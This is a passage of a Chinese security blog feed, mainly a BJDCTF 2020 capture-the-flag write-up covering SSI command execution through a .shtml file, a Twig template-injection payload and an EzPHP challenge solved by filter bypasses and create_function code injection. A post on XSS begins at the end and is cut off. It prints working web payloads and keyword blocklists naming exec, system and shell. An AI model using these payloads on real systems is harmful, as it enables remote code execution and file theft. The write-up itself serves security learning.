text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            $file_shtml = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            $text = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到我们只需要控制<code>password</code>的MD5值前六位为<code>6d0bc1</code>就可以成功写入一个<code>.shtml</code>文件，内容里有<code>username</code>的值，但发现文件名不可控，后来在响应头里看到了文件路径</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM截图20200202124321.png" style="zoom:80%;"><p>username写上一句话发现没能解析，后来了解到如果目标Apache服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用下面语法执行任意命令:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;id&quot; --&gt;</span></span><br></pre></td></tr></table></figure><p>怎样开启具体参见：<a href="https://www.zhangfangzhou.cn/apache-ssi-configuration.html">https://www.zhangfangzhou.cn/apache-ssi-configuration.html</a></p><p>可以构造如下payload:</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM截图20200202125427.png" style="zoom:80%;"><p>最终，在网站目录发现flag</p><h3 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h3><p>登陆之后发现Cookie里多了user，同样是SSTI，这个是twig模板，payload:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM截图20200202152050.png" style="zoom:80%;"><h3 id="EzPHP"><a href="#EzPHP" class="headerlink" title="EzPHP"></a>EzPHP</h3><p>查看源代码，发现<code>GFXEIM3YFZYGQ4A=</code>，base32解码得<code>1nD3x.php</code>，访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line">$shana = $_GET[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">$arg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$code = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这道题考的知识点比较多，分开记一下</p><h4 id="SERVER-‘QUERY-STRING’-匹配绕过"><a href="#SERVER-‘QUERY-STRING’-匹配绕过" class="headerlink" title="$_SERVER[‘QUERY_STRING’]匹配绕过"></a>$_SERVER[‘QUERY_STRING’]匹配绕过</h4><p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>返回url中查询的字符串，与此类似的还有：</p><ul><li><code>$_SERVER[&#39;REQUEST_URI&#39;]</code>返回访问此页面所需的URI</li><li><code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>返回包含当前脚本的路径</li><li><code>$_SERVER[&#39;PHP_SELF&#39;]</code>当前正在执行脚本的文件名</li></ul><p>举个例子：(浏览器自动将file的url编码解码了)</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM截图20200210162052.png" style="zoom:80%;"><p>可以看到，<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>和<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>在传输时不会url解码，而<code>$_GET</code>,<code>$_POST</code>会url解码，因此我们可以url编码绕过下面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (    preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字符串匹配绕过"><a href="#字符串匹配绕过" class="headerlink" title="字符串匹配绕过"></a>字符串匹配绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>由于没有<code>/s</code>修饰符用来在匹配时匹配换行符，我们可以使用<code>%0a</code>换行污染绕过</p><h4 id="REQUEST字母匹配绕过"><a href="#REQUEST字母匹配绕过" class="headerlink" title="$_REQUEST字母匹配绕过"></a>$_REQUEST字母匹配绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前的参数都是GET型的，而POST的优先级比GET的要高，因此我们可以POST同样名称满足条件的值，比如数字,</p><p>数组类型的数据不需要POST，<code>preg_match()</code>只能匹配字符串，数组得以绕过</p><h4 id="file-get-contents比对绕过"><a href="#file-get-contents比对绕过" class="headerlink" title="file_get_contents比对绕过"></a>file_get_contents比对绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>刚开始想的是<code>php://input</code>，后来发现要POST数据，因此便不能用了，这里可以用<code>data://</code>，示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><h4 id="sha1比较绕过"><a href="#sha1比较绕过" class="headerlink" title="sha1比较绕过"></a>sha1比较绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接数组绕过，或者sha1碰撞</p><h4 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h4><p>因为<code>extract()</code>函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量，所以这里我们可以传数组，即<code>flag[code]</code>和<code>flag[arg]</code>的形式</p><h4 id="create-function代码注入"><a href="#create-function代码注入" class="headerlink" title="create_function代码注入"></a>create_function代码注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>最后一个过滤我们可以用<code>create_function()</code>绕过:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myFunc = create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return($a+$b);&#125;eval($_POST[1]);\\&#x27;</span>);</span><br></pre></td></tr></table></figure><p>执行时相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>先看下所有变量:</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM截图20200210181423.png" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">POST:debu&#x3D;1&amp;passwd&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure><p>读源码：</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM截图20200210182446.png" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">POST： debu&#x3D;1&amp;passwd&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure><p>这里用的是取反绕过，脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = 1 f l a g . p h p&quot;</span>;</span><br><span class="line">$arr1 = explode(<span class="string">&#x27; &#x27;</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;~(&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr1 <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.bin2hex(~$value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;)&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>有点难顶，出题师傅太强了，脑瓜子嗡嗡的~</p><h4 id="非预期解define-fopen-fgets"><a href="#非预期解define-fopen-fgets" class="headerlink" title="非预期解define+fopen()+fgets()"></a>非预期解define+fopen()+fgets()</h4><p>没ban掉<code>fopen()</code>，可以<code>fgets()</code>读取文件，但是这个文件指针需要移动就不能读取完整文件，<code>$</code>被禁无法定义变量，最后测试无果后交给shana师傅，被shana师傅整出来了（ttttql），用常量，Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(aaa,fopen(~(%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>e%ce%<span class="number">99</span>%<span class="number">93</span>%cb%<span class="number">98</span>%d1%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f),r))；<span class="keyword">while</span>(!feof(aaa))var_dump(fgets(aaa));fclose(aaa);</span><br></pre></td></tr></table></figure><h4 id="非预期解数组操作"><a href="#非预期解数组操作" class="headerlink" title="非预期解数组操作"></a>非预期解数组操作</h4><p>加了个参数，传上去伪协议，然后<code>get_defined_vars()</code>数组获取到这个伪协议放到<code>require()</code>里包含，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?deb%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a&amp;file=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">2</span>c%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>&amp;rce=%<span class="number">70</span>%<span class="number">68</span>%<span class="number">70</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">66</span>%<span class="number">69</span>%<span class="number">6</span>c%<span class="number">74</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">2</span>f%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">3</span>d%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">76</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">74</span>%<span class="number">2</span>e%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">2</span>d%<span class="number">65</span>%<span class="number">6</span>e%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">2</span>f%<span class="number">72</span>%<span class="number">65</span>%<span class="number">73</span>%<span class="number">6</span>f%<span class="number">75</span>%<span class="number">72</span>%<span class="number">63</span>%<span class="number">65</span>%<span class="number">3</span>d%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">31</span>%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">34</span>%<span class="number">67</span>%<span class="number">2</span>e%<span class="number">70</span>%<span class="number">68</span>%<span class="number">70</span>&amp;rce2=r&amp;sha%<span class="number">6</span>e%<span class="number">61</span>[]=a&amp;pa%<span class="number">73</span>sw%<span class="number">64</span>[]=b&amp;fla%<span class="number">67</span>[co%<span class="number">64</span>e]=create_function&amp;fla%<span class="number">67</span>[ar%<span class="number">67</span>]=;&#125;<span class="keyword">require</span>(get_defined_vars()[_GET][rce]);%<span class="number">0</span>a<span class="comment">//</span></span><br><span class="line">解码后：?debu=aqua_is_cute</span><br><span class="line">&amp;file=data:,debu_debu_aqua&amp;rce=php:<span class="comment">//filter/read=convert.base64-encode/resource=rea1fl4g.php&amp;rce2=r&amp;shana[]=a&amp;passwd[]=b&amp;flag[code]=create_function&amp;flag[arg]=;&#125;require(get_defined_vars()[_GET][rce]);</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.gem-love.com/websecurity/770.html">https://www.gem-love.com/websecurity/770.html</a></p><p><a href="http://www.gtfly.top/2020/01/30/BJDCTF2020-EzPHP.html">http://www.gtfly.top/2020/01/30/BJDCTF2020-EzPHP.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> BJDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss漏洞及其利用方式</title>
      <link href="2020/01/27/xss%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
      <url>2020/01/27/xss%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了xss漏洞及其利用方式！</p><a id="more"></a><h2 id="什么是xss"><a href="#什么是xss" class="headerlink" title="什么是xss?"></a>什么是xss?</h2><p>XSS是跨站脚本攻击(Cross Site Scripting)，和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><h2 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h2><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>反射型xss一般出现在URL参数中及网站搜索栏中，由于需要点击包含恶意代码的URL才可以触发，并且只能触发一次，所以也被称为“非持久性xss”</p><p>举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss&quot;&#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; @$_GET[&#39;xss&#39;];</span><br><span class="line">if($xss!&#x3D;&#x3D;null)&#123;</span><br><span class="line">    echo $xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/27/xss%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/TIM截图20200205202004.png" style="zoom:67%;"><p>我们在输入框输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>就成功触发了弹框</p><p>反射型 XSS 的数据流向是：<code>浏览器 -&gt; 后端 -&gt; 浏览器</code></p><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" 